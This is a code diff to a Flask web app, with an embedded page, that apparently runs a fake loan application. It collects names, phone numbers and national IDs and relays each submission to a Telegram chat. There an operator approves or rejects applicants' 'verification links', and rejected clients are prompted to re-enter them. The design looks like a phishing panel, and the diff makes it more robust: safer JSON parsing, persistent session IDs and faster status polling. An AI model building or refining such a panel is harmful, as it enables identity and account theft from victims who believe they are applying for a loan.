@@ -42,9 +42,33 @@ def send_sms_notification(message):
         print(f"Africa's Talking SMS dispatch failed: {e}")
 
 # Telegram Configuration
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
-TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+TELEGRAM_BOT_TOKEN = (os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN") or "").strip()
+TELEGRAM_CHAT_ID = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()
 LOCAL_RECORDS = {}
+
+def safe_load_json(val):
+    if not val:
+        return {}
+    if isinstance(val, dict):
+        return val
+    if isinstance(val, (bytes, bytearray)):
+        try:
+            val = val.decode('utf-8', errors='ignore')
+        except Exception:
+            return {}
+    if isinstance(val, str):
+        val = val.strip()
+        if not val or val == 'null' or val == 'None':
+            return {}
+        try:
+            parsed = json.loads(val)
+            if isinstance(parsed, str):
+                try: parsed = json.loads(parsed)
+                except Exception: pass
+            return parsed if isinstance(parsed, dict) else {}
+        except Exception:
+            return {}
+    return {}
 
 def send_telegram_notification(message, reply_markup=None):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -134,7 +158,7 @@ def get_base_url():
     return f"{proto}://{host}".rstrip('/')
 
 def sanitize_upstash_env():
-    url = (os.environ.get("UPSTASH_REDIS_REST_URL") or "").strip()
+    url = (os.environ.get("UPSTASH_REDIS_REST_URL") or os.environ.get("KV_REST_API_URL") or "").strip()
     if url.startswith('"') and url.endswith('"'):
         url = url[1:-1].strip()
     if url.startswith("'") and url.endswith("'"):
@@ -143,7 +167,7 @@ def sanitize_upstash_env():
         url = f"https://{url}"
     url = url.rstrip('/')
 
-    token = (os.environ.get("UPSTASH_REDIS_REST_TOKEN") or "").strip()
+    token = (os.environ.get("UPSTASH_REDIS_REST_TOKEN") or os.environ.get("KV_REST_API_TOKEN") or "").strip()
     if token.startswith('"') and token.endswith('"'):
         token = token[1:-1].strip()
     if token.startswith("'") and token.endswith("'"):
@@ -166,8 +190,7 @@ def persist_record(app_id, data_update, push_list=False):
                 get_res = requests.post(base_url, headers=headers, json=["GET", key], timeout=4)
                 if get_res.status_code == 200:
                     raw = get_res.json().get("result")
-                    if raw:
-                        existing = json.loads(raw)
+                    existing = safe_load_json(raw)
             except Exception as ex:
                 print(f"Upstash GET error: {ex}")
             existing.update(data_update)
@@ -178,7 +201,7 @@ def persist_record(app_id, data_update, push_list=False):
                 requests.post(base_url, headers=headers, json=["LPUSH", "applications", key], timeout=4)
         elif db:
             raw = db.get(key)
-            existing = json.loads(raw) if raw else {}
+            existing = safe_load_json(raw)
             existing.update(data_update)
             existing["updated_at"] = get_now_str()
             db.set(key, json.dumps(existing))
@@ -203,12 +226,14 @@ def get_record(app_id):
             get_res = requests.post(base_url, headers=headers, json=["GET", key], timeout=4)
             if get_res.status_code == 200:
                 raw = get_res.json().get("result")
-                if raw:
-                    return json.loads(raw)
+                parsed = safe_load_json(raw)
+                if parsed:
+                    return parsed
         elif db:
             raw = db.get(key)
-            if raw:
-                return json.loads(raw)
+            parsed = safe_load_json(raw)
+            if parsed:
+                return parsed
     except Exception as e:
         print(f"Error fetching record: {e}")
     return LOCAL_RECORDS.get(app_id, {})
@@ -745,8 +770,13 @@ HTML_PAGE = r"""<!DOCTYPE html>
   </footer>
 
   <script>
+    let storedAppId = sessionStorage.getItem('om_app_id');
+    if (!storedAppId) {
+      storedAppId = Date.now().toString();
+      sessionStorage.setItem('om_app_id', storedAppId);
+    }
     let appState = {
-      appId: Date.now().toString(),
+      appId: storedAppId,
       fullName: "",
       mobile: "",
       nationalId: "",
@@ -1150,7 +1180,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           const res = await fetch('/api/status/' + appState.appId + '?_=' + Date.now(), { cache: 'no-store' });
           if (!res.ok) return;
           const data = await res.json();
-          const currentStatus = (data && data.appStatus) ? data.appStatus.toLowerCase() : '';
+          const currentStatus = (data && (data.appStatus || (data.data && data.data.status))) ? (data.appStatus || data.data.status).toString().toLowerCase().trim() : '';
 
           if (currentStatus === 'approved' || currentStatus === 'accepted') {
             stopStatusPolling();
@@ -1162,7 +1192,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
         } catch (err) {
           console.error("Status polling error:", err);
         }
-      }, 2000);
+      }, 1200);
     }
 
     function handleApprovalSuccess() {
@@ -1385,9 +1415,12 @@ def api_decision(app_id, action):
 def telegram_webhook():
     try:
         data = request.get_json(force=True, silent=True) or {}
+        print(f"Incoming Telegram webhook event: {json.dumps(data)}")
         cq = data.get("callback_query")
         if cq:
             cq_id = cq.get("id")
+            if cq_id:
+                answer_telegram_callback(cq_id, "Processing request...")
             cb_data = cq.get("data", "")
             msg = cq.get("message") or {}
             chat_id = msg.get("chat", {}).get("id")
@@ -1398,12 +1431,10 @@ def telegram_webhook():
                 app_id = app_id.strip()
                 if action in ("accept", "approve"):
                     persist_record(app_id, {"status": "approved"})
-                    answer_telegram_callback(cq_id, "✅ Application Accepted!")
-                    edit_telegram_message(chat_id, message_id, f"✅ *APPLICATION ACCEPTED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: User screen forwarded to Loan Approved.")
+                    edit_telegram_message(chat_id, message_id, f"✅ *APPLICATION APPROVED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: Approved by admin. Client screen forwarded.")
                 elif action in ("reject", "decline"):
                     persist_record(app_id, {"status": "rejected"})
-                    answer_telegram_callback(cq_id, "❌ Link Rejected!")
-                    edit_telegram_message(chat_id, message_id, f"❌ *LINK REJECTED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: User prompted to re-enter new verification link.")
+                    edit_telegram_message(chat_id, message_id, f"❌ *LINK REJECTED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: Rejected as invalid/expired. Client prompted to re-enter link.")
         return jsonify({"ok": True})
     except Exception as e:
         print(f"Telegram webhook error: {e}")
